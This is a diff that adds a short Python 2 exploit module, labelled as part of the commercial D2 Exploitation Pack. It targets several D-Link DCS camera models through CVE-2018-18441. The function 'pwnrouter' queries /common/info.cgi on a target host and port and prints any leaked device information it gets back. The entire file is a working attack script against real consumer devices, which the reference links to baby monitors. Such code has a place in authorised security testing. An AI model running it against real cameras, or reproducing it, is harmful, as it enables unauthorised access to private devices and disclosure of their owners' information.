@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_link_23'
+_vendor_ = 'd-link'
+_model_  = ['DCS-825L','DCS-5020L','DCS-932L']
+_vuln_   = 'Sensitive Information Disclosure Vulnerability'
+_cve_    = 'CVE-2018-18441'
+_ref_    = 'https://dojo.bullguard.com/dojo-by-bullguard/blog/i-got-my-eyeon-you-security-vulnerabilities-in-baby-monitor/'
+_port_   = 3128
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/common/info.cgi' % (host,port)    
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'hw_version' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text        
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
